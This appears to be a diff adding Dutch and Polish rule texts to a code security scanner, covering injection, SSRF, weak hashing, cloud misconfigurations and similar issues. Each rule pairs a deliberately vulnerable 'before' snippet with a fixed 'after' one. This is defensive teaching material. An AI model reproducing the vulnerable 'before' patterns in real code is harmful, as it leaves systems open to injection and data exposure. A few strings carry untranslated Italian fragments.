+    title: "De site accepteert verzoeken van elke andere website",
+    description:
+      "De CORS-header is ingesteld om verzoeken van elke origin (*) te accepteren, of de cors()-middleware wordt zonder beperkingen gebruikt. Elke website van derden kan je API's aanroepen vanuit de browser van een al geauthenticeerde gebruiker.",
+    fix: {
+      before: `app.use(cors())`,
+      after: `app.use(cors({ origin: ["https://tuosito.com"] }))`,
+    },
+  },
+  "admin-function-missing-auth": {
+    title: "Een functie met beheerdersrechten controleert niet wie hem gebruikt",
+    description:
+      "Een route of functie waarvan de naam op beheerdersactiviteiten wijst, bevat in de nabije regels geen enkele authenticatie- of rolcontrole. Iedereen die de URL kent, zou hem kunnen uitvoeren.",
+    fix: {
+      before: `router.post("/admin/delete-user", async (req, res) => {
+  await db.users.delete(req.body.id)
+})`,
+      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {
+  await db.users.delete(req.body.id)
+})`,
+    },
+  },
+  ssrf: {
+    title: "De site kan worden gedwongen externe code uit te voeren",
+    description:
+      "Een uitgaand HTTP-verzoek (fetch, axios) gebruikt rechtstreeks een waarde uit een verzoek van een gebruiker als bestemmings-URL. Een kwaadwillende gebruiker kan je server interne of willekeurige adressen laten aanroepen — Server-Side Request Forgery.",
+    fix: {
+      before: `const data = await fetch(req.query.url)`,
+      after: `const ALLOWED = new Set(["https://api.jouwdienst.com"])
+if (!ALLOWED.has(req.query.url)) throw new Error("URL niet toegestaan")
+const data = await fetch(req.query.url)`,
+    },
+  },
+  "weak-password-hashing": {
+    title: "Wachtwoorden worden beschermd met een methode die nu makkelijk te kraken is",
+    description:
+      "Op dezelfde regel worden md5() of sha1() toegepast op een waarde die aan een wachtwoord is gekoppeld. Deze algoritmes zijn te snel te berekenen: een aanvaller met de database kan miljarden wachtwoorden per seconde proberen.",
+    fix: {
+      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
+      after: `const hashed = await bcrypt.hash(password, 12)`,
+    },
+  },
+  "k8s-run-as-root": {
+    title: "Een container in het Kubernetes-manifest is ingesteld om als root te draaien",
+    description:
+      '"runAsUser: 0" of "runAsNonRoot: false" in de securityContext dwingen de container expliciet om als root te draaien. Als een aanvaller erin slaagt code binnen de container uit te voeren (bijv. door een kwetsbare library te misbruiken), maakt root zijn binnen de container een ontsnapping naar de host — of een bredere impact — makkelijker.',
+    fix: {
+      before: `securityContext:
+  runAsUser: 0`,
+      after: `securityContext:
+  runAsNonRoot: true
+  runAsUser: 1000`,
+    },
+  },
+  "k8s-privilege-escalation": {
+    title: "Een container in het Kubernetes-manifest kan meer rechten verkrijgen dan waarmee hij begon",
+    description:
+      '"allowPrivilegeEscalation: true" in de securityContext laat een proces binnen de container meer rechten verkrijgen dan het proces dat het startte (bijv. via een setuid-binary). Gecombineerd met een kwetsbaarheid in de applicatie is dit weer een stap richting het uitvoeren van code met meer rechten dan bedoeld.',
+    fix: {
+      before: `securityContext:
+  allowPrivilegeEscalation: true`,
+      after: `securityContext:
+  allowPrivilegeEscalation: false`,
+    },
+  },
+  "k8s-host-namespace-access": {
+    title: "Een pod in het Kubernetes-manifest deelt het netwerk, de processen of het gedeelde geheugen van de host",
+    description:
+      '"hostNetwork", "hostPID" of "hostIPC" op true halen de pod uit zijn normale isolatie: hostNetwork stelt de pod bloot op het netwerk van de host (waarbij de netwerkpolicies van de cluster worden omzeild), hostPID geeft zicht op elk proces op de hostmachine, hostIPC geeft toegang tot het gedeelde geheugen van de host. Vrijwel nooit nodig voor een normale app — meestal alleen voor laagwaardige systeem-/monitoringtools.',
+    fix: {
+      before: `spec:
+  hostNetwork: true`,
+      after: `spec:
+  hostNetwork: false`,
+    },
+  },
+  "terraform-s3-block-public-access-disabled": {
+    title: "Block Public Access is uitgeschakeld op een S3-bucket gedefinieerd in Terraform",
+    description:
+      'Een of meer van de vier beveiligingen in "aws_s3_bucket_public_access_block" (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) staan op false. Dat betekent niet dat de bucket al openbaar is, maar het verwijdert een vangnet dat zou voorkomen dat hij per ongeluk openbaar wordt gemaakt in de toekomst.',
+    fix: {
+      before: `resource "aws_s3_bucket_public_access_block" "example" {
+  block_public_acls = false
+}`,
+      after: `resource "aws_s3_bucket_public_access_block" "example" {
+  block_public_acls       = true
+  ignore_public_acls      = true
+  block_public_policy     = true
+  restrict_public_buckets = true
+}`,
+    },
+  },
+  "terraform-iam-wildcard-policy": {
+    title: "Een IAM-policy gedefinieerd in Terraform verleent volledige toegang",
+    description:
+      'Een statement met actie "*" en resource "*" verleent volledige toegang tot elke AWS-service en -resource — dezelfde controle die al wordt gedaan op de live IAM-status, hier rechtstreeks uit de code gelezen voordat die zelfs maar wordt toegepast. Het kan bedoeld zijn voor een noodrol, maar dat moet worden bevestigd: voor dagelijks gebruik verleen je alleen de rechten die echt nodig zijn.',
+    fix: {
+      before: `statement {
+  effect    = "Allow"
+  actions   = ["*"]
+  resources = ["*"]
+}`,
+      after: `statement {
+  effect    = "Allow"
+  actions   = ["s3:GetObject"]
+  resources = ["arn:aws:s3:::je-bucket/*"]
+}`,
+    },
+  },
+  "gcp-storage-bucket-public": {
+    title: "Een Google Cloud Storage-bucket wordt leesbaar gemaakt voor iedereen",
+    description:
+      'Een "google_storage_bucket_iam_member"- of "google_storage_bucket_iam_binding"-resource verleent een rol aan "allUsers" of "allAuthenticatedUsers" — de eerste maakt de bucket leesbaar voor iedereen op internet, zelfs zonder Google-account; de tweede voor iedereen met een willekeurig Google-account, niet alleen wie toegang zou moeten hebben.',
+    fix: {
+      before: `resource "google_storage_bucket_iam_member" "public" {
+  bucket = google_storage_bucket.example.name
+  role   = "roles/storage.objectViewer"
+  member = "allUsers"
+}`,
+      after: `resource "google_storage_bucket_iam_member" "example" {
+  bucket = google_storage_bucket.example.name
+  role   = "roles/storage.objectViewer"
+  member = "user:iemand@example.com"  # alleen wie er echt toegang toe zou moeten hebben, niet allUsers/allAuthenticatedUsers
+}`,
+    },
+  },
+  "azure-storage-public-access": {
+    title: "Openbare blobtoegang is ingeschakeld op een Azure-opslagaccount",
+    description:
+      '"allow_blob_public_access" staat op true op een "azurerm_storage_account": iedereen die de URL van een openbaar gemaakte blob/container kent, kan hem lezen, zonder enige authenticatie.',
+    fix: {
+      before: `resource "azurerm_storage_account" "example" {
+  allow_blob_public_access = true
+}`,
+      after: `resource "azurerm_storage_account" "example" {
+  allow_blob_public_access = false
+}`,
+    },
+  },
+  "gcp-iam-overly-broad-role": {
+    title: "Een Google Cloud IAM-rol verleent volledige toegang (Owner/Editor)",
+    description:
+      'Een "google_project_iam_binding"/"google_project_iam_member" (of het equivalent op organisatie-/mapniveau) wijst de primitieve rol "roles/owner" of "roles/editor" toe — bijna volledige toegang tot elke service in het project. Het kan bedoeld zijn voor een noodaccount, maar dat moet worden bevestigd: voor dagelijks gebruik verleen je alleen de specifiekere vooraf gedefinieerde rollen die echt nodig zijn.',
+    fix: {
+      before: `resource "google_project_iam_member" "admin" {
+  project = "my-project"
+  role    = "roles/owner"
+  member  = "user:dev@example.com"
+}`,
+      after: `resource "google_project_iam_member" "admin" {
+  project = "my-project"
+  role    = "roles/storage.admin"  # alleen de vooraf gedefinieerde rol die echt nodig is, niet roles/owner
+  member  = "user:dev@example.com"
+}`,
+    },
+  },
+  "azure-role-assignment-owner": {
+    title: "Een Azure-roltoewijzing verleent volledige toegang (Owner)",
+    description:
+      'Een "azurerm_role_assignment" wijst de rol "Owner" toe — volledige toegang, inclusief controle over de rechten van andere gebruikers, over de hele toegewezen scope (abonnement, resourcegroep...). Het kan bedoeld zijn voor een noodaccount, maar dat moet worden bevestigd: voor dagelijks gebruik verleen je alleen de specifiekere rol die echt nodig is (bijv. "Contributor" op één resourcegroep).',
+    fix: {
+      before: `resource "azurerm_role_assignment" "example" {
+  scope                = data.azurerm_subscription.primary.id
+  role_definition_name = "Owner"
+}`,
+      after: `resource "azurerm_role_assignment" "example" {
+  scope                = azurerm_resource_group.example.id
+  role_definition_name = "Contributor"  # alleen de specifiekere rol die echt nodig is, niet Owner op het hele abonnement
+}`,
+    },
+  },
+  "weak-random-token": {
+    title: "Een beveiligingstoken wordt gegenereerd met een generator voor willekeurige getallen die niet cryptografisch veilig is",
+    description:
+      "Een waarde met een naam als token/session/reset/otp/csrf wordt gegenereerd met Math.random() (JS), random.random() (Python) of rand() (PHP) — generators die niet voor beveiliging zijn ontworpen, waarvan de reeksen voorspelbaar zijn. Een token dat zo is gegenereerd, kan worden geraden of gereconstrueerd, wat het doel ervan tenietdoet (bijv. een link voor wachtwoordherstel die iedereen zou kunnen voorspellen).",
+    fix: {
+      before: `const resetToken = Math.random().toString(36).slice(2);`,
+      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, niet Math.random — onvoorspelbaar`,
+    },
+  },
+  "ldap-injection": {
+    title: "Een LDAP-filter wordt opgebouwd door rechtstreeks een verzoekwaarde te concateneren",
+    description:
+      'Een regel die een LDAP-filter opbouwt (bijv. "(uid=...)") bevat rechtstreeks een waarde uit het verzoek, zonder enige escaping van speciale LDAP-tekens. Wie die waarde controleert, kan de logica van het filter veranderen — bijvoorbeeld een authenticatiecontrole omzeilen of directorygegevens lezen die hij niet zou mogen zien.',
+    fix: {
+      before: `const filter = \`(uid=\${req.body.username})\`;
+client.search(base, { filter });`,
+      after: `const filter = \`(uid=\${ldapEscape(req.body.username)})\`; // speciale LDAP-tekens moeten altijd worden ge-escaped voordat ze in een filter worden gebruikt
+client.search(base, { filter });`,
+    },
+  },
+  "xss-dangerous-html": {
+    title: "Tekst geschreven door gebruikers zou code in de browser kunnen uitvoeren",
+    description:
+      "Inhoud wordt als ruwe HTML in de pagina ingevoegd (dangerouslySetInnerHTML, v-html, .innerHTML) in plaats van als platte tekst. Als die inhoud gebruikersinvoer bevat, kan die scripts bevatten die worden uitgevoerd in de browser van wie de pagina leest.",
+    fix: {
+      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
+      after: `<div>{comment.text}</div>
+// of, als HTML nodig is: DOMPurify.sanitize(comment.text)`,
+    },
+  },
+  "public-storage-bucket": {
+    title: "De ruimte voor geüploade bestanden is zichtbaar voor iedereen",
+    description:
+      "Een storage bucket (Supabase Storage, S3) is geconfigureerd als openbaar. Als die documenten, foto's of door gebruikers geüploade bestanden bevat, kan iedereen die het pad kent — of raadt — er zonder authenticatie bij.",
+    fix: {
+      before: `supabase.storage.createBucket("uploads", { public: true })`,
+      after: `supabase.storage.createBucket("uploads", { public: false })
+// serveer bestanden met tijdelijk geldige signed URL's: createSignedUrl(path, 60)`,
+    },
+  },
+  "csrf-state-changing-get": {
+    title: "Eén link is genoeg om data te verwijderen of te wijzigen",
+    description:
+      "Een GET-route voert een bewerking uit die data wijzigt (het pad bevat delete/remove/update/edit). GET-verzoeken worden al uitgevoerd door simpelweg een link te bezoeken of een afbeelding van een externe site te laden — het klassieke opstapje voor een CSRF-aanval.",
+    fix: {
+      before: `router.get("/posts/:id/delete", deletePost)`,
+      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
+    },
+  },
+  "insecure-token-storage": {
+    title: "Logingegevens opgeslagen in de browser zijn niet goed beschermd",
+    description:
+      "Een toegangstoken wordt opgeslagen in localStorage. In tegenstelling tot een httpOnly-cookie kan elk script dat op de pagina draait (inclusief kwaadaardige code die via XSS is geïnjecteerd) hem lezen en stelen.",
+    fix: {
+      before: `localStorage.setItem("authToken", token)`,
+      after: `// stel het token in als httpOnly-cookie vanaf de server:
+res.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
+    },
+  },
+  "open-redirect": {
+    title: "De site kan worden gebruikt om door te verwijzen naar een scamwebsite",
+    description:
+      "De site verwijst de gebruiker door naar een adres dat rechtstreeks uit het verzoek komt (query, body, params) zonder te controleren dat het een bekend domein is. Een link die eruitziet alsof die naar je site verwijst, kan in werkelijkheid naar een phishingpagina leiden.",
+    fix: {
+      before: `res.redirect(req.query.next)`,
+      after: `const ALLOWED = new Set(["/dashboard", "/profile"])
+res.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
+    },
+  },
+  idor: {
+    title: "Het wijzigen van een nummer in het adres kan andermans gegevens tonen",
+    description:
+      "Een databasequery gebruikt rechtstreeks een identifier uit de URL (req.params.id) zonder in de nabije regels te controleren dat die bij de gebruiker hoort die het verzoek doet. Het wijzigen van het id in het adres zou toegang kunnen geven tot de gegevens van een andere gebruiker — Insecure Direct Object Reference.",
+    fix: {
+      before: `const order = await Order.findById(req.params.id)`,
+      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
+    },
+  },
+  "header-injection": {
+    title: "Een verzoekwaarde komt rechtstreeks in een HTTP-responseheader terecht",
+    description:
+      "Een HTTP-responseheader wordt ingesteld met een waarde die rechtstreeks uit het verzoek komt (query, body, params), zonder te controleren dat die geen regeleinde (CRLF) bevat. Een aanvaller kan extra headers invoegen of zelfs een volledig andere response — response splitting — waardoor cache, cookies of de inhoud die aan andere gebruikers wordt getoond, kunnen worden gemanipuleerd.",
+    fix: {
+      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
+      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])
+res.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
+    },
+  },
+  "docker-missing-user": {
+    title: "De Dockerfile stelt geen non-root-gebruiker in",
+    description:
+      "Geen USER-instructie in de Dockerfile: zonder die draait de container als root. Als een aanvaller erin slaagt code binnen de container uit te voeren (bijv. door een kwetsbare library te misbruiken), maakt root zijn binnen de container een ontsnapping naar de host — of een bredere impact op het omliggende systeem — makkelijker.",
+    fix: {
+      before: `FROM node:20-slim
+WORKDIR /app
+COPY . .
+CMD ["node", "server.js"]`,
+      after: `FROM node:20-slim
+WORKDIR /app
+COPY . .
+USER node
+CMD ["node", "server.js"]`,
+    },
+  },
+  "k8s-missing-run-as-non-root": {
+    title: "Het Kubernetes-manifest dwingt niet expliciet af dat als non-root-gebruiker wordt gedraaid",
+    description:
+      'Nergens in het manifest staat "runAsNonRoot" (niet op pod- en niet op containerniveau): zonder dit in te stellen, draait een container als welke gebruiker de image ook definieert — vaak standaard root, als de image dat zelf niet heeft veranderd. Door het expliciet op true te zetten, start de pod niet als de image nog steeds als root probeert te draaien, in plaats van dat je dit pas na een incident ontdekt.',
+    fix: {
+      before: `containers:
+  - name: app
+    image: myapp:1.0`,
+      after: `containers:
+  - name: app
+    image: myapp:1.0
+    securityContext:
+      runAsNonRoot: true`,
+    },
+  },
+  "gha-unpinned-action": {
+    title: "Een CI-actie van derden is niet vastgezet op een precieze versie (commit-SHA)",
+    description:
+      'De workflow gebruikt een actie van derden die wordt gerefereerd via tag of branch (bijv. "@v1", "@main") in plaats van via commit-SHA. Wie het beheert — of wie dat account compromitteert — kan die referentie op elk moment naar een andere commit verplaatsen, waardoor stilletjes verandert wat er in de CI draait, met toegang tot de geheimen ervan. Een commit-SHA wijst altijd naar exact dezelfde code.',
+    fix: {
+      before: `uses: some-org/some-action@v1`,
+      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, vastgezet op de commit-SHA — werk de SHA bij wanneer je de versie bijwerkt`,
+    },
+  },
+  "gha-excessive-permissions": {
+    title: "De workflow geeft zichzelf alle tokenrechten in plaats van alleen de rechten die hij gebruikt",
+    description:
+      '"permissions: write-all" geeft de GITHUB_TOKEN van de workflow schrijftoegang tot alles — issues, pull requests, packages, deployments — zelfs als de workflow er maar een deel van gebruikt. Als een stap in de workflow wordt gecompromitteerd (een kwaadaardige dependency, een geïnjecteerd script), vergroten die bredere rechten wat wie dat misbruikt kan doen.',
+    fix: {
+      before: `permissions: write-all`,
+      after: `permissions:
+  contents: read
+  pull-requests: write  # alleen de rechten die de workflow echt gebruikt`,
+    },
+  },
+  "insecure-cookie-flags": {
+    title: "Een sessie- of authenticatiecookie wordt ingesteld zonder de vlaggen Secure en HttpOnly",
+    description:
+      'Een cookie met een naam die lijkt op sessie/auth/token wordt ingesteld zonder "httpOnly" en "secure" tussen de opties. Zonder httpOnly kan JavaScript op de pagina — inclusief via XSS geïnjecteerde code — die cookie lezen. Zonder secure kan hij ook worden verzonden over een niet-versleutelde HTTP-verbinding.',
+    fix: {
+      before: `res.cookie("session", sessionId)`,
+      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
+    },
+  },
+  "no-login-rate-limit": {
+    title: "Het loginformulier blokkeert geen te veel pogingen achter elkaar",
+    description:
+      "Een loginroute is gedefinieerd in het bestand, maar er is geen spoor van rate-limiting-middleware in hetzelfde bestand. Zonder limiet op pogingen kan een aanvaller wachtwoorden na elkaar proberen (brute force) zonder te worden vertraagd.",
+    fix: {
+      before: `router.post("/login", loginHandler)`,
+      after: `import rateLimit from "express-rate-limit"
+const loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })
+router.post("/login", loginLimiter, loginHandler)`,
+    },
+  },
+  "sensitive-data-in-logs": {
+    title: "Wachtwoorden of gevoelige gegevens komen terecht in logs",
+    description:
+      "Een aanroep van console.log (of vergelijkbaar) bevat een variabele genaamd password, token, secret of apiKey. Als deze logs terechtkomen in een externe service of een bestand, blijven gevoelige gegevens veel langer blootgesteld dan nodig.",
+    fix: {
+      before: `console.log("login attempt", { email, password })`,
+      after: `console.log("login attempt", { email })`,
+    },
+  },
+  "docker-unpinned-base-image": {
+    title: 'De basisimage van de Dockerfile gebruikt de tag ":latest"',
+    description:
+      'Een FROM-instructie gebruikt expliciet de tag ":latest" in plaats van een precieze versie. "latest" verandert in de loop van de tijd: dezelfde build, op een ander moment opnieuw uitgevoerd, kan een andere versie van de basisimage krijgen — een niet-reproduceerbare build, en een ongewenste update kan binnenkomen zonder dat iemand heeft besloten dat die zou moeten.',
+    fix: {
+      before: `FROM node:latest`,
+      after: `FROM node:20.11-slim`,
+    },
+  },
+  "docker-add-remote-url": {
+    title: "De Dockerfile downloadt een extern bestand met ADD in plaats van COPY",
+    description:
+      "Een ADD-instructie met een http/https-URL downloadt tijdens de build een bestand van internet, zonder integriteitscontrole en met inhoud die onzichtbaar is in de repository. Als die URL ooit wordt gecompromitteerd, haalt de build willekeurige inhoud binnen zonder dat iemand dat merkt door alleen de Dockerfile te lezen.",
+    fix: {
+      before: `ADD https://example.com/install.sh /tmp/install.sh`,
+      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\
+    && echo "<hash atteso>  /tmp/install.sh" | sha256sum -c -`,
+    },
+  },
+  "vulnerable-dependency": (original) => ({
+    title: original.title.replace("Dipendenza vulnerabile:", "Kwetsbare dependency:"),
+    description: original.description,
+    fix: {
+      before: original.fix.before,
+      after: original.fix.after.replace(
+        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
+        "Nog geen gecorrigeerde versie bekend — overweeg een alternatief pakket of volg de updates van het project."
+      ),
+    },
+  }),
+},
+  pl: {
+  "supabase-service-role-in-client": {
+    title: "Tajny klucz Supabase trafia do pliku widocznego w przeglądarce",
+    description:
+      "Zmienna z publicznym prefiksem (np. NEXT_PUBLIC_, VITE_) lub plik po stronie klienta odwołuje się do service role key Supabase. Ten klucz omija Row Level Security: jeśli trafi do pakietu przeglądarki, każdy może go odczytać i działać jako administrator bazy danych.",
+    fix: {
+      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
+      after: `// app/api/admin/route.ts (tylko serwer)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
+    },
+  },
+  "hardcoded-secret": {
+    title: "Hasła lub tajne klucze są zapisane bezpośrednio w kodzie",
+    description:
+      "Klucz API, token lub hasło wygląda na zapisane jako wartość literalna zamiast odczytywane ze zmiennej środowiskowej. Każdy, kto przeczyta kod źródłowy (lub repozytorium, jeśli jest publiczne), zdobywa ten sekret.",
+    fix: {
+      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
+      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
+    },
+  },
+  "env-file-with-real-values": {
+    title: "Plik z prawdziwymi hasłami projektu jest wśród analizowanych",
+    description:
+      "Plik .env z prawdziwymi wartościami (nie .env.example) jest uwzględniony w analizie. Jeśli ten plik trafi do repozytorium lub publicznego wdrożenia, wszystkie zawarte w nim dane uwierzytelniające zostają ujawnione.",
+    fix: {
+      before: `# .env (zacommitowany przez pomyłkę)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
+      after: `# .env.example (zacommitowany)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env pozostaje poza repozytorium (.gitignore)`,
+    },
+  },
+  "missing-row-level-security": {
+    title: "Każdy może odczytać lub zmodyfikować dane wszystkich użytkowników",
+    description:
+      "Row Level Security jest wyłączone, albo zasada zezwala na dostęp każdemu (USING (true)) bez sprawdzania, kto wysyła żądanie. Każdy uwierzytelniony użytkownik — a nawet anonimowy — może odczytać lub zmodyfikować dane wszystkich innych.",
+    fix: {
+      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
+      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
+    },
+  },
+  "sql-injection": {
+    title: "Wartość wprowadzona przez użytkownika trafia bezpośrednio do zapytania w bazie danych",
+    description:
+      "Zapytanie SQL jest budowane przez bezpośrednią konkatenację lub interpolację ciągu znaków zamiast użycia parametrów. Jeśli ten tekst pochodzi (nawet pośrednio) od użytkownika, może zmienić samo zapytanie — SQL injection.",
+    fix: {
+      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
+      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
+    },
+  },
+  "plaintext-password-storage": {
+    title: "Hasła wydają się być niezabezpieczone",
+    description:
+      "Pole hasła jest zapisywane dokładnie tak, jak przyszło w żądaniu, a w pliku nie pojawia się żadna funkcja haszowania (bcrypt, argon2, scrypt). Jeśli baza danych zostanie naruszona, wszystkie hasła są natychmiast użyteczne.",
+    fix: {
+      before: `await db.users.insert({ email, password: req.body.password })`,
+      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
+    },
+  },
+  "hardcoded-jwt-secret": {
+    title: "Sekret używany do podpisywania logowań jest zapisany jawnie w kodzie",
+    description:
+      "Sekret przekazywany do jwt.sign / jwt.verify (lub zmienna JWT_SECRET) jest wartością literalną w kodzie zamiast pochodzić ze zmiennej środowiskowej. Każdy, kto go przeczyta, może tworzyć ważne tokeny dostępu dla dowolnego użytkownika.",
+    fix: {
+      before: `jwt.sign(payload, "super-secret-key-123")`,
+      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
+    },
+  },
+  "command-injection": {
+    title: "Serwer można zmusić do wykonania zewnętrznych poleceń",
+    description:
+      "Funkcja wykonująca polecenia systemowe (exec, execSync, spawn) otrzymuje ciąg znaków zbudowany przez interpolację lub konkatenację. Jeśli część tego ciągu pochodzi z danych wejściowych użytkownika, osoba nim sterująca może uruchomić dowolne polecenia na serwerze.",
+    fix: {
+      before: "execSync(`convert ${filename} output.png`)",
+      after: `execFile("convert", [filename, "output.png"])`,
+    },
+  },
+  "path-traversal": {
+    title: "Plik na serwerze można odczytać lub zapisać, wybierając ścieżkę z zewnątrz",
+    description:
+      'Funkcja, która odczytuje, zapisuje lub wysyła plik, pobiera ścieżkę bezpośrednio z wartości żądania (query, body, params) bez sprawdzenia, czy pozostaje w dozwolonym folderze. Atakujący może wstawić "../", aby wyjść z zamierzonego folderu i odczytać lub nadpisać dowolne pliki na serwerze (np. plik konfiguracyjny z danymi uwierzytelniającymi).',
+    fix: {
+      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
+      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("Ścieżka niedozwolona")\n  res.sendFile(target)\n})`,
+    },
+  },
+  "nosql-injection": {
+    title: "Wartość wprowadzona przez użytkownika jest wykonywana jako kod wewnątrz zapytania MongoDB",
+    description:
+      "Operator $where w MongoDB uruchamia JavaScript po stronie serwera dla każdego dokumentu — jeśli ten ciąg znaków jest budowany przez konkatenację wartości pochodzącej od użytkownika, osoba nim sterująca może spowodować wykonanie dowolnego kodu w kontekście bazy danych, a nie tylko zmienić filtr jak przy zwykłym SQL injection.",
+    fix: {
+      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
+      after: `db.collection.find({ username: username })`,
+    },
+  },
+  ssti: {
+    title: "Wartość wprowadzona przez użytkownika jest interpretowana jako szablon, a nie jako dane",
+    description:
+      "Funkcja kompilująca/renderująca szablon otrzymuje CAŁY szablon z wartości żądania, zamiast używać stałego szablonu i przekazywać tylko dane. Atakujący może pisać bezpośrednio w składni silnika szablonów (np. {{7*7}} dla Jinja2) i wykonać kod na serwerze — Server-Side Template Injection, co często prowadzi do wykonania dowolnych poleceń, a nie tylko problemu z wyświetlaniem jak przy XSS.",
+    fix: {
+      before: `return render_template_string(request.args.get("name"))`,
+      after: `return render_template("profile.html", name=request.args.get("name"))`,
+    },
+  },
+  xxe: {
+    title: "Parser XML można zmusić do odczytu plików lub wysyłania zewnętrznych żądań",
+    description:
+      "Parser XML (DocumentBuilderFactory) jest tworzony bez jawnego wyłączenia zewnętrznych encji (DOCTYPE) w pobliskich liniach. Jeśli parser otrzyma XML z niezaufanego źródła, atakujący może zdefiniować zewnętrzną encję, aby odczytać pliki na serwerze lub zmusić go do skontaktowania się z wybranym przez siebie adresem — XML External Entity.",
+    fix: {
+      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
+      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
+    },
+  },
+  "docker-hardcoded-secret": {
+    title: "Sekret jest zapisany bezpośrednio w instrukcji ENV lub ARG w Dockerfile",
+    description:
+      "Zmienna o nazwie typu password/secret/token/key ma wartość literalną w instrukcji ENV lub ARG. W przeciwieństwie do pliku .env (który zwykle nie trafia do obrazu), ta wartość zostaje zaszyta w samym obrazie Docker — każdy, kto może go pobrać lub sprawdzić historię warstw, może ją odzyskać, nawet jeśli linia zostanie usunięta w późniejszej wersji Dockerfile.",
+    fix: {
+      before: `ENV DB_PASSWORD=supersecret123`,
+      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# przekazywane z: docker build --build-arg DB_PASSWORD=*** (lub, jeszcze lepiej,\n# za pomocą secret mount BuildKit, który nigdy nie trafia do historii warstw)`,
+    },
+  },
+  "k8s-privileged-container": {
+    title: "Kontener w manifeście Kubernetes działa jako privileged",
+    description:
+      '"privileged: true" w securityContext kontenera wyłącza niemal całą zwykłą izolację między kontenerem a hostem: kontener może uzyskać dostęp do urządzeń hosta, zmienić jego konfigurację sieciową, a w wielu przypadkach faktycznie zyskać dostęp root na maszynie, która go uruchamia. Prawie nigdy niepotrzebne dla zwykłej aplikacji.',
+    fix: {
+      before: `securityContext:\n  privileged: true`,
+      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # tylko naprawdę potrzebne capabilities`,
+    },
+  },
+  "k8s-plaintext-secret-env": {
+    title: "Sekret jest zapisany jawnie w zmiennej env manifestu Kubernetes",
+    description:
+      'Zmienna środowiskowa o nazwie typu password/secret/token/key ma wartość literalną ("value:") zamiast być odczytywana z Secret ("valueFrom.secretKeyRef"). Sam manifest — często zacommitowany do repozytorium — zawiera więc sekret jawnie, widoczny nawet dla kogoś, kto może tylko odczytać konfigurację, niekoniecznie wykonywać polecenia w klastrze.',
+    fix: {
+      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
+      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
+    },
+  },
+  "terraform-open-security-group": {
+    title: "Security group w Terraform otwiera wrażliwy port na cały internet",
+    description:
+      'Reguła z "cidr_blocks" obejmującym 0.0.0.0/0 (dowolny adres IP) znajduje się blisko wrażliwego portu — SSH (22), RDP (3389) lub typowego portu bazy danych (MySQL, Postgres, MongoDB, Redis, SQL Server). Każdy w internecie może spróbować połączyć się z tą usługą, nie tylko ten, kto powinien.',
+    fix: {
+      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
+      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # tylko twoja prywatna sieć albo bastion host\n}`,
+    },
+  },
+  "gcp-firewall-open-to-internet": {
+    title: "Reguła zapory Google Cloud otwiera wrażliwy port na cały internet",
+    description:
+      'Zasób "google_compute_firewall" z "source_ranges" obejmującym 0.0.0.0/0 (dowolny adres IP) zezwala na ruch do wrażliwego portu — SSH (22), RDP (3389) lub typowego portu bazy danych (MySQL, Postgres, MongoDB, Redis, SQL Server). Każdy w internecie może spróbować połączyć się z tą usługą, nie tylko ten, kto powinien.',
+    fix: {
+      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
